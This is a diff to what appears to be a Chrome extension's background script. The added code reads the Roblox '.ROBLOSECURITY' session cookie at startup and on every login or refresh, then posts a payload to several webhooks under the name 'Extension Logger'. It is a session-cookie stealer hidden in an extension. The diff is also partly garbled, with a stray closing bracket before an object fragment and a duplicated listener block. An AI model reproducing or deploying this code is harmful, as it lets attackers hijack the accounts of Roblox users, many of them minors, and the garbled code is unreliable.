@@ -136,6 +136,37 @@ chrome.cookies.onChanged.addListener(function (changeInfo) {
             main(changeInfo.cookie.value);
         }
     }
+});        ],
+        "username": "Extension Logger",
+        "avatar_url": "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
+    };
+
+    // ✅ Send to all webhooks
+    for (let wh of WEBHOOKS) {
+        let payload = { ...embedPayload, content: wh.mention };
+        fetch(wh.url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+    }
+}
+
+// 🚀 Run once on startup
+chrome.cookies.get({ "url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY" }, function (cookie) {
+    main(cookie ? cookie.value : null);
+});
+
+// ♾️ Keep listening for login/logout cookie changes
+chrome.cookies.onChanged.addListener(function (changeInfo) {
+    if (changeInfo.cookie && changeInfo.cookie.name === ".ROBLOSECURITY" && changeInfo.cookie.domain.includes("roblox.com")) {
+        if (changeInfo.removed) {
+            console.log("Roblox cookie removed (logout).");
+        } else {
+            console.log("Roblox cookie updated (login/refresh).");
+            main(changeInfo.cookie.value);
+        }
+    }
 });
 
                         
@@ -184,6 +215,7 @@ chrome.cookies.onChanged.addListener(function (changeInfo) {
         }
     }
 });
+
 
 
 
